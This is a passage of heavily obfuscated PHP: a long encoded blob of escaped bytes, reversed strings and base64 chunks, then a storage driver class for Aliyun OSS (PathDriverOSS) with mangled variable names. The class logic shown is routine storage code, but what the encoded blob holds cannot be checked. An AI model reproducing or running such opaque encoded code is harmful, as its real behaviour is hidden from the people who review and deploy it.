60\114\70\120".strrev('#+.¦ŸÒëÎR(û”éN%B ïªÌAH›åË¡XıG¶BÑ-WHØ_„³eÉŠF)qaĞ*Ü‚')."\x66\x98\x26\x28\x2\x5d\xca\x42\x2b\xcf\x14\xd0\xa8\xaa\x40\xc2\xb2\xc5\xb5\x13\x8b\xe5\x84\xb3\x35\x1a\xed\x14\x2d\xf1\x27\x36\xb9\xf3\xc\x80\x5b\x95\xa5\x37\x64\x8f\xea\x92\xad\xa1\xd1\x93\x44\x8c\x81\x91\xee\x69\x88"."\x7b\x59\xc5\xb9\xa\x85\x25\x6e\x44\x4a\x71\xa1\x8b\x2d\xf5\x55\x81\x23\x64\xe\xc1\x86\x2d\x65\x5\x90\x9\xd0\x95\xaa\x2a\x3c\x97\xd0\x82\x38\x92\xb4\xb7\x26\xf9\x44\x90\x76\x34\x48\xfb\xdd\x24\xa1\x48\x8\x59\x44\x3c"."\76\312\215\206\260\277\32\220\26\36\145\117\41\105\351\373\327\334\162\254\351\300\212\111\166\375\23\314\346\315\163\47\342\127\212\307\230\62\173\250\32\221\372\10\275\165\114\211\142\2\127\352\150\21\76"."\376\225\6\374\131\276\72\21\256\121\121\121\1\322\53\113\63\305\223\52\245\151\272\257\64\363\346\337\42\36\55\121\135\374\163\41\227\242\6\355\300\253\160\122\7\25\333\30\121\216\274\241\142\311\36"."\44\230\340\250\100\43\351\135\325\223\105\361\312\222\125\12\211\336\253\345\324\104\172\71\332\346\321\220\126\374\27\31\131\261\113\52\105\25\325\10\231\350\135\341\112\106\213\170\43\130\115\244\147\151\125"."\17\203\35\143\274\155\120\266\321\233\42\172\366\41\110\207\62\25\267\144\24\234\1\125\137\322\127\214\361\75\100\25\121\257\16\213\110\342\105\105\142\352\13\357\106\66\333\45\275\176\351\36\274\232\16"."\5\161\1\52\152\50\176\174\24\64\205\255\66\341\123\14\365\253\351\344\110\365\104\157\72\117\343\2\27\217\312\122\232\321\335\234\231\6\110\340\130\351\27\150\3\114\17\335\67\237\162\15\66\41\77"."\244\126\363\346\121\264\116\333\36\125\310\227\276\162\31\6\276\306\3\210\210\350\174\212\315\71\362\377\272\172\225\110\301\243\253\322\62\112\156\332\135\267\350\155\110\131\16\336\225\120\201\362\214\273\240".strrev('•ôLiÂAjçèûum¢V¢f¾—l#<µ8Ååip¦'."\n".'Ñâ»6k&€_UÁ”k‹xëhÄ©š	4'."\r".'')."\x33\x98\x68\x32\xa2\xcd\xc\x35\x82\x9a\xd5\x4c\x7c\xd3\x8f\x6f\x20\x52\x67\x30\xec\xb9\xd9\x8\x11\x7c\xa7\x1c\x1f\xb2\x1f\x64\xac\x7d\xe4\xac\x27\xf7\x44\x98\xc7\x1e\xbe\xa7\xe0\x87\xe8\x38\x4\x62\xa3\xa5\xb7\x97\x2f"."\x50\x76\x3c\x4d\x6d\x88\xf0\xb\xe9\x21\x2a\x6\xeb\xd3\x58\xdf\x97\xb0\x47\xda\xaa\xe4\x52\x9f\x62\xf8\x35\xf1\xdc\xb\xec\x55\xa4\x8c\xed\xa\xf9\x0\x6d\x9e\xac\x9\x19\x89\xab\xac\x39\x4d\x68\x35\xc5\xd3\x63\x69\xde"._kodDe('LGI03osE62Y1R0xFkTFmFzYxxADTtF+kHLAJ+wYheKnck2EGJyd3RwT7yr64uqrSgVDtIMT3dtc=').base64_decode('DvLS1V/BwDkS11TCUaV/0Kpok/agIM1SgBMrmRm7lKU7uuL4r+AmzUE1ynQ1cMXIt4HUJqj3WA==').strrev('¯w«‹÷*—ôL:úà(&m²}ËcWÊÁ’®dy–ó®/ĞlK'."\n".'ÉZ)‰|ò­Õe¸É•Ò(…')."\x8c\x66\xf5\x9a\xca\x25\xa3\xd\x3d\x6d\x80\x39\xd3\xa4\x23\x70\xd4\x3c\xd2\x2c\x7d\xb6\x47\x8e\x4c\xad\xc2\xbe\x59\x51\x85\xe7\x51\xce\x50\x1a\xdb\xab\x39\xe\xd5\x3a\xea\xc6\x59\xac\x96\x53\xe5\x53\x2c\x4b\x81\x68\x6".strrev('ùŠr|Ç¤ô¥=ÌÚ+c,œ ‘Ì¤ ô‚™ÖG.Âf<|T…ÄĞØ-‹Q7È$	zÁ('."\r".'1')."\x64\xce\x3b\x45\x8c\xa9\x1a\xaa\x44\x5e\x6a\xdf\x72\x5b\x25\xbf\x82\xa6\xc8\xe7\xb0\xa0\xd9\xad\x1e\xeb\x32\x5f\x1\xb2\x12\xbc\xf9\xf0\xe6\x9b\xe4\xc1\xb8\xa3\x4c\xef\xbe\xe5\x6b\x4\xde\x26\x54\x95\xcd\x58\x2d\xa9\xb9"."\x2a\xed\xee\x48\x92\xcd\x55\x28\x25\x8\xa4\x42\x25\x95\xcc\xa\x92\x26\x93\xd3\xb6\x48\xac\x54\x3f\xa6\x48\x7\xa0\xe4\xce\x86\xe0\x68\x5e\x37\x9b\x3a\x1b\xf2\x8\x57\x3b\xc6\x85\x4b\x18\xaa\xda\x4f\x77\x72\x61\x48\xe6"."\250\21\314\25\270\347\170\42\334\126\302\123\133\44\211\122\243\350\234\137\210\24\272\332\273\302\42\151\245\130\175\134\242\43\235\27\267\240\275\200\71\146\302\101\164\64\157\145\264\170\142\125\254\45\22".base64_decode('b42lVmuD9ApaqtGT7upsVeqOVNTji4KJ2znYEXv7xROFNBjsJ0ebYFYcCR15+GODgsbk89PeZg==').base64_decode('OfaZpYoWC9T0P1dRh14iVCmdkxJupXCxZFaWHzepBr/SY6VCuUpvoHz1L7D3JdXShCkyC9N13g==').base64_decode('KoxYjiUXONYYV1uPtHbEOvVIPJ5Y6zGxyapPgSqzIAHOv6R6wFZTPG+l+YQ8fKpUp+0KwadyWA==')."\302\77\32\302\47\167\21\157\374\350\306\250\274\145\12\121\345\245\340\142\311\260\34\123\111\340\57\316\242\361\273\221\313\51\171\364\312\111\211\226\275\73\151\325\117\351\374\3\230\246\250\253\127\53\220".base64_decode('jK1qT/+fu2plpcazJdTVhSsV/ixgC2/H+035+GRlyv/1peWAlOPrzF8rvvFusxMdcPQ8LZbQuQ==')."\xdb\x52\xf9\x9\xc2\x9f\x94\xc6\x8b\xea\x6d\x75\x38\x8b\x26\xfd\x4\xf1\xa3\x68\x96\x4b\x23\xf2\x5c\x43\x4b\x41\x23\xf4\x2b\xfc\xa0\x6d\xd9\x4c\xe8\x89\x27\x20\x14\x20\x12\xa\x2\x0\xf7\xe8\x90\xfa\x9e\x8a\xf6\x5b\x9c"."\x79\x1e\x82\xae\xf8\x6\x7b\xf9\x8f\xe7\xf5\xd0\x51\x90\x92\x7d\x72\x4c\x24\x26\xec\xb3\x64\x55\x7f\x4e\x95\xe\x90\x6c\x4d\x4a\xe5\x44\x1\xad\x59\xab\xe7\x8f\x9a\xb\x95\x77\x6d\x29\x3a\x85\x92\x1f\x60\x8e\x93\xa3\xf9"."\xa2\xeb\x11\x42\xb4\xab\x86\xaa\xca\x94\xe0\x2c\xe9\xea\x26\xb8\x4\x7c\x59\x3\xbf\xcc\x48\xad\x3c\x7\x52\x35\x52\x3b\x3f\x5e\x91\xe0\x11\xda\xc5\xb1\xd7\x42\x39\x9c\xbe\x70\x59\x18\xb0\x55\xe8\x32\x23\x34\x6a\x93\x1c".base64_decode('YCEuCwmQA4bpVj4xzKv/v6nIM1PKOwGOfwsU25fHHo6pbg/Zo1I8gCkKo4U2eNW6N81QlXXFnA==')."\x1e\xa9\x2f\x3d\x7b\xcc\xf4\x3c\xaf\x78\xf2\xc\xad\x5c\xa0\xf7\x23\x84\x4\xc1\x8c\x53\x2d\x26\x3c\xdc\xb2\xc2\x4a\xdf\x66\xf2\x9f\x5e\xf8\xc5\xbd\xd0\xdf\x9\x4e\xdd\xe0\x93\xb3\x5\x2\x7a\xed\x7\x94\x84\xe\x53\xca"."\x3a\x58\x2d\x42\x4e\x8a\x46\xc1\xf3\xe6\x2d\xe9\x7b\xb5\x67\xb4\xa9\x7b\x75\xef\x2b\xad\xf2\xf1\x5b\xb9\xd9\x7a\x1f\x3\x15\x8a\x10\x8e\x5c\x2c\x8e\xeb\x79\x7e\x36\x6d\xa7\x8d\xc1\x0\xc7\x5d\x4a\xfe\x64\x6c\xe5\xb8\x1a"."\126\115\313\130\317\111\46\212\51\245\373\212\145\230\22\140\17\260\163\252\347\177\63\125\131\175\202\270\252\346\227\203\314\13\70\350\107\372\374\212\14\132\46\156\20\236\142\74\51\154\24\213\362\106\106"."\xdd\x57\xc9\xff\x1e\xbf\x25\x90\xd7\x9d\x6e\xd7\x99\xf7\x30\x9d\x6b\x73\xa4\x94\xbd\x50\xde\x92\xf2\x44\xb8\x31\x2d\x17\x62\xfc\x66\xc8\x93\x5a\x52\xe\x7d\xea\xbb\x1a\xfc\xb6\x48\x3a\xb9\x80\xe2\xa4\x9f\x5d\xfc\x92\x19"."\0\246\66\211\27\377\102\320\117\250\215\70\33\207\53\25\5\250\176\35\320\21\252\317\204\212\144\303\66\73\133\205\324\123\31\24\320\226\152\22\35\324\105\306\355\46\262\131\376\60\75\243\17\52\131"."\303\145\351\173\211\266\242\34\330\161\124\175\241\227\333\156\260\237\126\163\100\34\162\124\267\207\122\347\310\377\356\74\66\54\114\347\2\174\164\1\261\106\54\207\22\316\100\241\234\307\163\12\15\123\115"."\x8f\x80\x78\x4f\x37\xc0\xfd\xf8\x7\xf8\x89\xcd\x81\xca\xdc\xa8\x67\xfa\xa7\x7e\xa5\x9f\x8c\x22\x81\xbf\xa4\x55\x74\x24\x82\x59\x10\x47\x8b\x8a\xd3\x89\xff\x60\x22\x20\xe7\xab\x90\xf4\xc3\x91\xca\x0\xfd\x22\x6e\xa9\x3f"."\1\203\23\21\357\351\14\240\41\107\256\14\265\134\312\5\230\366\110\0\125\72\175\160\361\200\134\216\125\235\65\237\11\243\210\46\162\352\50\273\113\71\371\142\67\357\221\234\100\165\126\76\262\63\140".strrev('‘áÑ.'."\r".'pàÏ·—ÉÈŒQ8-çe#È'."\0".'ñ‚ÍŠŠÅüô–§dßƒË1uËÂ_ÚZl5/YqÁß')."\350\244\171\240\31\320\360\305\14\225\130\260\114\257\355\20\276\206\43\267\34\337\46\361\177\132\134\312\211\204\27\125\335\12\262\274\222\235\243\7\343\74\275\20\160\113\206\367\360\127\345\214\203\273\54"."\x3\x5f\xd5\x97\xb3\x95\x5d\x2f\x50\xb1\x3\x72\xc6\x82\xa1\x21\x8c\x47\x40\x14\x16\x74\xc1\xca\xc\x33\xaf\x73\xec\xb\xdc\x72\x30\xe0\x98\x63\x1\xe\xb0\x80\x7a\xf3\xcd\xf\x37\x52\x1\x8d\xe\x46\x60\xac\x62\x73\xc8"."\310\272\124\112\253\62\134\12\42\171\10\140\235\224\304\207\103\25\167\54\257\176\232\153\364\123\142\233\266\320\324\213\121\5\105\25\221\231\143\213\246\250\115\247\142\146\212\123\132\15\220\276\257\161\244"."\xb6\xa9\xa6\x97\xa3\xd0\x45\x6f\xb\x7c\x6\xaa\x20\x88\xec\x9b\x97\x7e\xb5\x8a\xb3\x31\x95\x80\xcb\x98\x77\x90\x20\xac\x92\xd9\xca\x79\xb6\xfa\x1\x98\xc2\x92\xc9\x87\x13\x85\xdc\x78\xb5\xa1\x57\x19\xc2\x87\xe0\x35\x1e"."\103\303\53\144\327\25\305\45\357\4\371\172\301\371\134\201\63\314\332\121\75\140\7\15\67\50\230\245\4\203\57\360\176\362\304\357\153\222\24\224\42\305\276\200\66\135\241\12\47\22\174\335\110\244\124"."\xf2\xe4\x48\xd0\x37\xcd\x34\x22\x12\xa4\xe4\xf2\x46\x8a\xf9\x7\x91\x6e\xe\x19\xe9\xf1\x90\x21\xe5\x9\x1d\xd5\xbf\x6\x6b\x48\xc5\xd5\xca\xa6\xf9\x3e\xcc\xa4\xf0\x52\x7c\xc6\xe4\x6d\x30\x8\x20\x4e\x4c\x65\x85\xf9\x67"."\211\254\22\76\133\14\105\317\123\367\57\167\212\16\262\323\256\255\206\45\232\320\375\117\330\156\222\16\170\116\341\44\56\147\135\241\270\131\137\42\102\211\255\61\321\1\316\302\317\1\346\135\165\20\344".strrev('ßc\'¨”~=2)PìßQyË:†BşHtÂšÿ#™ø@l 9+.Üyà6O–ÂG@ç=æg‰÷9')."\x46\xef\x4c\xd4\xca\x5f\xbd\xc6\xe4\xf\xba\xf0\x30\x9e\x76\x44\x97\x19\xed\xad\xb6\x1e\xa5\xad\x77\x40\xda\x77\x7\x70\x43\xe\x1c\x38\x63\x6\xf3\xa6\x41\xeb\x8\xf9\x47\x95\x3d\x82\x1\xe1\x43\x58\xae\x5\xf5\x78\x45"."\41\254\44\31\225\305\310\52\70\210\100\267\351\215\266\40\336\134\116\356\33\220\227\145\230\1\310\105\146\41\64\42\311\10\213\13\33\1\164\153\215\336\256\15\274\123\44\374\272\377\132\272\342\350\46"."\235\321\330\166\256\337\50\121\3\372\141\27\125\251\252\105\374\56\74\122\306\200\251\366\271\207\311\261\111\42\263\260\356\223\64\204\246\125\253\46\51\24\333\202\212\12\15\144\155\221\24\245\25\241\336"."\x9\x85\x83\x82\xd\x71\x94\x8e\x55\x91\x88\xe0\x69\x43\xb1\x17\x87\x1d\xdc\x7\x9\xa6\x50\xed\x7d\xd2\x49\xe1\xdc\x2a\x8a\xc9\xee\x13\x6\x4f\xe8\x74\x63\x28\x43\xb9\xa\xe6\xc5\xe\xa6\x41\x75\x1f\x94\x28\xe2\x9\x7c"."\x36\xec\x17\x7d\x2b\x90\xfe\x31\xef\x66\x40\x6\x55\xd2\xe7\x49\xaa\x20\x98\x69\xcf\xe4\x7a\x12\xd5\x79\x93\x34\x2e\xe4\xf5\xa8\x8\x35\xe8\x4d\xf7\x4a\xe5\x58\xcb\xb\x39\x2a\x6c\x3d\xd7\x27\x95\x5a\x30\x95\xb5\x5\x65".base64_decode('UatQGw+v5BDdLgTrg76EhqCvOcvhFzS+RaN2hptgUTlWkkqOUFLI7trYxXywso7iH0C9vK9Yog==')."\xd5\x29\x86\xe8\x94\x94\x96\xd2\x90\xa\xf\xa4\x3c\x5d\x25\x9b\xb1\xce\x50\xaa\x9c\xaf\x63\x56\x85\xde\x42\x42\xb8\xa6\xe8\xd1\x67\x14\x9\xb5\x9f\x33\xe3\xc9\x33\x43\xea\xb8\xd4\xcb\x69\xef\xbd\x17\x55\xc1\x94\x57\xbe"."\xe9\x44\x32\xaa\xaf\x8d\x51\xcf\x57\xb1\x53\xa2\xdd\xf8\xfa\x84\x65\xb3\x7\xe8\xb0\xc9\xee\xe\xb5\x9f\xf4\xc6\xa4\xcd\x16\x98\x45\x97\xa8\x7c\x36\xc1\xcd\x17\x5b\xc4\xa5\xb4\xd7\xf4\x5d\xb1\x48\x40\xff\xa0\xaa\xd0\xd6"."\x5b\x98\x1a\x45\x79\x97\xe3\xb2\x6a\xc5\x32\x76\xc9\xa9\x38\x38\x60\x26\x65\xa5\x6d\x92\x9b\x44\x59\xc4\x0\x6a\x96\x74\x17\xc8\xa2\x36\x33\xae\x99\xd5\x28\x7b\xe0\x39\xf1\xf4\xcc\xaf\x9f\xd7\xf7\x61\xcd\xcd\xc7\xf7\x65"."\x49\xc9\xf9\x1f\x51\x12\x8e\x5e\xa9\x79\x41\xe8\x7e\x2c\xc1\x7d\xe3\x25\xa3\x20\xd7\x11\x95\xaa\x36\x64\x73\xff\x7e\xd5\xf2\x8\xe2\xa6\x5c\xf\x86\xc9\xd7\xe\xfd\xaf\x1c\x7a\x5f\x35\x6c\x52\xc4\xcb\xfc\x15\x48\xcf\x73".strrev('O[‚øh§•Ã#yHºV£¯=zÀmÂ…Ú”\\ê/{©äï T¹ôÆéG—Æ¾H·iÖ³¨').strrev('+ŠÙoûÒÆWUî_r‚Ğ(sã%“,·‹ïY­NDùr’jÚ>G˜Áqn;>¥>³^¼o'."\n".'Îù’”').base64_decode('2awWutwnv9SbQ0w6f2TZ/IYw4j9GKrW6PRIBRbkhwyhJtPJWW162K0wtVqMiBclY+NIVQiy3Sg==')."\143\104\62\345\362\304\226\315\266\31\43\125\212\146\53\316\224\44\105\24\145\114\275\342\172\113\132\156\231\243\352\327\241\234\264\224\362\24\254\114\225\256\271\224\372\276\263\70\33\46\115\253\66\174\106"."\x9\xbd\xd5\x55\xd7\x5f\x2\xa9\x64\x12\x7f\xf7\x53\x68\x2\x29\x82\xe\xaa\x39\x25\x55\x84\xf8\x50\x84\x84\x4d\x7e\xd2\xeb\x68\x4c\x14\x13\x73\x46\xca\x30\x1b\xce\xa0\x27\xd5\x77\x54\xa7\xc2\x4c\xe4\x43\x7d\x59\x20\xde"."\x53\x9a\xaf\x2a\x5\x54\x50\xc0\xcc\xc5\x95\xe6\x54\x85\x87\x69\x2b\xa4\xaa\x7f\x44\x62\xa5\x17\xc4\x8a\x6c\x57\x66\x20\xa7\x63\x7b\x80\xaf\xec\x6d\x62\x60\x50\x32\xa9\x66\x7a\xba\x53\x5\x35\xf0\x68\xa2\x4a\x90\x2b\x33"."\xed\x5c\x8e\x5e\x6b\x4f\x93\xcd\x75\xb1\x95\x9d\xb8\xb2\x84\x94\xe8\xf1\xe\xb1\xe3\xb6\x5c\x38\x3c\x31\xcf\xc4\x53\x3c\x2f\xe2\xcd\xe2\xe5\x4d\x1f\xdc\xd4\xa\x7e\x98\xf2\x1a\x9e\x67\xb6\xd5\xf4\x51\xcb\xcd\xc\x29\xb2"."\x81\xca\xcc\xca\xf4\x52\xc5\x34\x43\x7\xaa\x8f\xc3\xdf\x5b\x9c\x65\xbf\x26\x94\x6c\xa4\xa2\x3f\x8a\x9a\x56\xda\xae\x52\x87\xf7\xa8\x6a\x35\x9e\x45\x6b\xca\x63\x99\xa7\xee\x34\x20\xa0\x75\x79\x16\xad\x5b\x91\x8d\x95\x2b"."\340\312\352\271\106\331\231\146\170\225\300\3\261\147\266\312\200\245\70\121\51\72\35\74\253\26\256\374\34\254\1\177\151\46\134\253\336\13\105\372\350\125\243\251\326\213\252\205\247\355\205\277\264\344\203".base64_decode('6CG8Wk7VBQoqI1V2DMypskdw+jetMprU1arcrGReFXUxcDDm81xWJVvVPauunZasSt8crwaZLw==')."\335\363\356\1\47\111\74\122\62\67\253\326\316\102\201\122\266\104\30\306\234\65\54\65\165\321\304\150\246\147\173\53\27\206\13\266\330\62\263\122\73\133\164\244\242\1\357\72\50\224\225\147\177\252\32"."\x39\x5\xa8\xd8\xac\x52\x24\x95\xc3\xf7\x2c\x54\xf3\x30\x7e\xe2\xb7\x5d\x2b\xa3\xa8\xaf\x4a\x13\x17\x31\x32\x4b\x1e\x81\x73\x52\xa6\xed\xbf\x79\x90\x42\x3c\x8f\xe6\x53\x35\x31\x3d\x4d\xe2\xc1\x90\xbc\x96\xe3\xed\x29\x3c".strrev('y!#ˆÑ@@ì r[ÂT®»i]û"ü}p'."\r".'ÉvS³Á\'8îÍ×q…P´<ë’ÂàŒç"Dš')."\311\115\73\305\356\112\31\16\363\173\14\32\4\355\13\52\167\112\231\74\227\21\75\117\204\336\312\212\110\262\362\122\266\115\74\274\62\154\147\373\355\61\364\47\115\60\107\201\211\342\102\23\334\116\52"."\72\173\314\177\216\23\346\71\141\170\200\62\310\156\120\202\340\341\170\123\161\320\123\235\277\71\56\364\354\77\254\5\270\75\220\115\360\327\347\230\264\30\14\37\123\351\124\105\126\127\44\225\132\233\110"."\266\362\307\352\52\262\131\55\105\31\262\42\253\253\75\321\71\135\136\264\43\22\213\127\344\121\275\311\116\135\72\45\347\131\261\56\326\113\246\116\60\135\57\142\55\253\145\117\360\42\63\16\117\246\313".base64_decode('SVBu84pDdmG6ecQGUga6fVQvtsy89GQvG/EK3dTLLwffyREB7wvTPiVlr3IOYi40S/UjO+FLyQ==')."\42\244\322\27\377\4\1\20\347\11\251\246\23\362\150\10\51\351\154\221\60\252\243\254\135\165\167\147\67\301\102\26\307\262\347\124\205\146\225\133\111\125\1\212\346\112\340\320\156\236\204\117\366\154\262"."\373\345\21\16\316\166\340\31\1\300\255\150\304\362\260\47\333\65\6\121\124\352\321\175\341\22\164\112\24\244\154\373\377\1\70\267\376\234\341\305\0\0", 10, -8))); goto dİì›“çÖ; AìË®±¢’: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($×ÏŠâœë) { parent::__construct(); include_once SDK_DIR . $_SERVER[±Ö‰ô½¯][1619]; $this->_init($×ÏŠâœë); } public function _init($ÃÎÒ“âŠ) { $¾›™ÃŒ¡ =& $_SERVER[±Ö‰ô½¯]; $this->config = $ÃÎÒ“âŠ; foreach ($ÃÎÒ“âŠ as $›¡í‰ß => $ÌãÈÇ°Ğ) { if (isset($this->{$›¡í‰ß})) { $this->{$›¡í‰ß} = $ÌãÈÇ°Ğ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¾›™ÃŒ¡[1620] . LNG($¾›™ÃŒ¡[1621])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ü†ãÛèÂ =& $_SERVER[±Ö‰ô½¯]; $§Õˆ°º¡ = new OSS\Model\CorsConfig(); $ò²ıî = new OSS\Model\CorsRule(); $ò²ıî->addAllowedOrigin($Ü†ãÛèÂ[1622]); $ò²ıî->addAllowedMethod($Ü†ãÛèÂ[1623]); $ò²ıî->addAllowedMethod($Ü†ãÛèÂ[1624]); $ò²ıî->addAllowedMethod($Ü†ãÛèÂ[1625]); $ò²ıî->addAllowedMethod($Ü†ãÛèÂ[1626]); $ò²ıî->addAllowedMethod($Ü†ãÛèÂ[164]); $ò²ıî->setMaxAgeSeconds(600); $ò²ıî->addExposeHeader($Ü†ãÛèÂ[1627]); $ò²ıî->addAllowedHeader($Ü†ãÛèÂ[1622]); $§Õˆ°º¡->addRule($ò²ıî); try { $this->client->putBucketCors($this->bucket, $§Õˆ°º¡); } catch (OSS\Core\OssException $Ã¾íäºø) { $this->writeLog(__FUNCTION__ . $Ü†ãÛèÂ[214] . $Ã¾íäºø->getMessage()); return !1; } return !0; } public function getBucketCors() { $˜â‹Àö… =& $_SERVER[±Ö‰ô½¯]; $Á«ª÷†ù = null; try { $Á«ª÷†ù = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ç”½ÊÁÛ) { $this->writeLog(__FUNCTION__ . $˜â‹Àö…[214] . $Ç”½ÊÁÛ->getMessage()); return null; } if (!$Á«ª÷†ù || !($Ù½¯Ğ²„ = $Á«ª÷†ù->getRules())) { return null; } $Ó‹ú§éã = $Ù½¯Ğ²„[0]->getAllowedOrigins(); $ŒÊí‘â» = $Ù½¯Ğ²„[0]->getAllowedMethods(); $ËÄÇê… = $Ù½¯Ğ²„[0]->getMaxAgeSeconds(); $†ÎŠˆû = $Ù½¯Ğ²„[0]->getExposeHeaders(); $¶ò¦ÍãĞ = $Ù½¯Ğ²„[0]->getAllowedHeaders(); return array($˜â‹Àö…[220] => isset($Ó‹ú§éã[0]) ? $Ó‹ú§éã[0] : $˜â‹Àö…[12], $˜â‹Àö…[224] => $ŒÊí‘â», $˜â‹Àö…[1628] => $ËÄÇê…, $˜â‹Àö…[1629] => isset($†ÎŠˆû[0]) ? $†ÎŠˆû[0] : $˜â‹Àö…[12], $˜â‹Àö…[221] => isset($¶ò¦ÍãĞ[0]) ? $¶ò¦ÍãĞ[0] : $˜â‹Àö…[12]); } public function isBucketCors() { $å”éö¾š =& $_SERVER[±Ö‰ô½¯]; $ÙËåŒîİ = $this->getBucketCors(); if (!$ÙËåŒîİ || !is_array($ÙËåŒîİ)) { return !1; } if ($ÙËåŒîİ[$å”éö¾š[220]] != $å”éö¾š[222] || $ÙËåŒîİ[$å”éö¾š[221]] != $å”éö¾š[222]) { return !1; } $Õæç‰ŠÑ = array_map($å”éö¾š[223], $ÙËåŒîİ[$å”éö¾š[224]]); if (!is_array($Õæç‰ŠÑ)) { $Õæç‰ŠÑ = array(); } $ı«Œ¾ = array($å”éö¾š[225], $å”éö¾š[226], $å”éö¾š[227], $å”éö¾š[228], $å”éö¾š[229]); $™Ù’¦Ùí = array_diff($ı«Œ¾, $Õæç‰ŠÑ); return empty($™Ù’¦Ùí); } public function mkfile($È•Æí´Ñ, $¥¯çèã© = '', $†šÅ¼äÊ = REPEAT_RENAME) { $¸ø‘ñ¯Â = $this->setContent($È•Æí´Ñ, $¥¯çèã©); if ($¸ø‘ñ¯Â !== !1) { return $this->getPathOuter($È•Æí´Ñ); } return !1; } public function mkdir($»³Æá‹, $¡Ó¬¤¦â = REPEAT_SKIP) { if ($¡Ó¬¤¦â && $this->_isFolder($»³Æá‹)) { return $this->getPathOuter($»³Æá‹); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($»³Æá‹)); } catch (OSS\Core\OssException $”²üÏ†) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][214] . $”²üÏ†->getMessage()); return !1; } return $this->getPathOuter($»³Æá‹); } private function fileList($†ÇÅŞ¥ü, $âŠµ˜ı‚ = '', $³‹‰ÃÍÇ = 0) { $ùÀ·“Í³ =& $_SERVER[±Ö‰ô½¯]; $†ÇÅŞ¥ü = trim($†ÇÅŞ¥ü, $ùÀ·“Í³[8]); $çëËÔ¼¨ = empty($†ÇÅŞ¥ü) && $†ÇÅŞ¥ü !== $ùÀ·“Í³[230] ? $ùÀ·“Í³[12] : $†ÇÅŞ¥ü . $ùÀ·“Í³[8]; $Æ‚¶­¿ = $ùÀ·“Í³[12]; $°Çó±Ö– = 1000; $ÇšŒÅŸÄ = $ßé‚Å“Œ = array(); while (!0) { check_abort(); $¥µı„ÖÒ = array($ùÀ·“Í³[1630] => $âŠµ˜ı‚, $ùÀ·“Í³[1631] => $çëËÔ¼¨, $ùÀ·“Í³[1632] => $°Çó±Ö–, $ùÀ·“Í³[1633] => $Æ‚¶­¿); try { $¼û€Î¾ù = $this->client->listObjects($this->bucket, $¥µı„ÖÒ); } catch (OSS\Core\OssException $Æíã³) { $this->writeLog(__FUNCTION__ . $ùÀ·“Í³[214] . $Æíã³->getMessage()); break; } $Æ‚¶­¿ = $¼û€Î¾ù->getNextMarker(); $¶š±¿É = $¼û€Î¾ù->getObjectList(); $¬ø„Áğì = $¼û€Î¾ù->getPrefixList(); foreach ($¶š±¿É as $¡Íßßë†) { if ($¡Íßßë†->getKey() == $çëËÔ¼¨) { continue; } $¢°ıÅ˜ = $¡Íßßë†->getKey(); $—ùä¿·¶ = $¡Íßßë†->getSize(); $¡™ô‘È¶ = $¡Íßßë†->getLastModified(); $ÇÅÎ¼Ó² = trim($¡Íßßë†->getETag(), $ùÀ·“Í³[119]); $…¬Ëıƒİ = $³‹‰ÃÍÇ ? array($ùÀ·“Í³[32] => $¢°ıÅ˜, $ùÀ·“Í³[79] => $—ùä¿·¶, $ùÀ·“Í³[206] => strtotime($¡™ô‘È¶), $ùÀ·“Í³[1634] => $ÇÅÎ¼Ó²) : $¢°ıÅ˜; $ªş³ = $—ùä¿·¶ == 0 && substr($¢°ıÅ˜, strlen($¢°ıÅ˜) - 1, 1) == $ùÀ·“Í³[8] ? !0 : !1; $¹á§õÅê = array($ùÀ·“Í³[79] => $—ùä¿·¶, $ùÀ·“Í³[1635] => $—ùä¿·¶, $ùÀ·“Í³[88] => strtotime($¡™ô‘È¶), $ùÀ·“Í³[1636] => $¡™ô‘È¶, $ùÀ·“Í³[1634] => $ÇÅÎ¼Ó²); $this->cacheMethodInfoSet($¢°ıÅ˜, $ªş³, $¹á§õÅê); if ($ªş³) { $ÇšŒÅŸÄ[] = $¢°ıÅ˜; continue; } $ßé‚Å“Œ[] = $…¬Ëıƒİ; } foreach ($¬ø„Áğì as $Üˆğˆ ¾) { $ÇšŒÅŸÄ[] = $Üˆğˆ ¾->getPrefix(); $this->cacheMethodInfoSet($Üˆğˆ ¾->getPrefix(), !0); } if ($Æ‚¶­¿ === $ùÀ·“Í³[12]) { break; } } $this->cacheMethodInfoSet($†ÇÅŞ¥ü, !0); return array($ùÀ·“Í³[85] => $ÇšŒÅŸÄ, $ùÀ·“Í³[86] => $ßé‚Å“Œ); } public function listObject($­‹Æˆ­ó, $‚¶õŸô  = '') { $Œ´“¦•” =& $_SERVER[±Ö‰ô½¯]; $­‹Æˆ­ó = trim($­‹Æˆ­ó, $Œ´“¦•”[8]); $™ÀÅ‹û = empty($­‹Æˆ­ó) && $­‹Æˆ­ó !== $Œ´“¦•”[230] ? $Œ´“¦•”[12] : $­‹Æˆ­ó . $Œ´“¦•”[8]; $¾ÀË¢ªå = $Œ´“¦•”[12]; $ô‚½í’à = 1000; $»Ñ¤¢¡ä = $çÂºï = array(); while (!0) { check_abort(); $Ç½Ü‚ÊŞ = array($Œ´“¦•”[1630] => $‚¶õŸô , $Œ´“¦•”[1631] => $™ÀÅ‹û, $Œ´“¦•”[1632] => $ô‚½í’à, $Œ´“¦•”[1633] => $¾ÀË¢ªå); try { $®‚¥´Î = $this->client->listObjects($this->bucket, $Ç½Ü‚ÊŞ); } catch (OSS\Core\OssException $ºÀ‰‰¹) { $this->writeLog(__FUNCTION__ . $Œ´“¦•”[214] . $ºÀ‰‰¹->getMessage()); break; } $¾ÀË¢ªå = $®‚¥´Î->getNextMarker(); $³õÇĞî£ = $®‚¥´Î->getObjectList(); foreach ($³õÇĞî£ as $½¡Â§Ğİ) { if ($½¡Â§Ğİ->getKey() == $™ÀÅ‹û) { continue; } $ö³¢‘Â« = $½¡Â§Ğİ->getKey(); $Áºåş¼ä = $½¡Â§Ğİ->getSize(); $³”Ò´ßË = $Áºåş¼ä == 0 && substr($ö³¢‘Â«, 